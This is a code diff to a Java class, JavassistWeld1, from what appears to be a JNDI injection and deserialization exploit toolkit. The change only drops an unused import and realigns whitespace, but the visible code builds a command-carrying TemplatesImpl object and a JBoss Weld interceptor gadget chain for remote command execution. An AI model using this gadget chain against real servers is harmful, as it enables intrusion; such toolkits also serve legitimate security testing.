@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -24,7 +23,6 @@ import java.lang.reflect.Constructor;
 import java.util.*;
 
 
-
 /*
     by @matthias_kaiser
 */
@@ -40,8 +38,8 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
         tpl = Gadgets.createTemplatesImpl(command);
 
         InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
-        ReflectiveClassMetadata metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
-        InterceptorReference    interceptorReference = ClassMetadataInterceptorReference.of(metadata);
+        ReflectiveClassMetadata  metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
+        InterceptorReference     interceptorReference = ClassMetadataInterceptorReference.of(metadata);
 
         Set<InterceptionType> s = new HashSet<InterceptionType>();
         s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
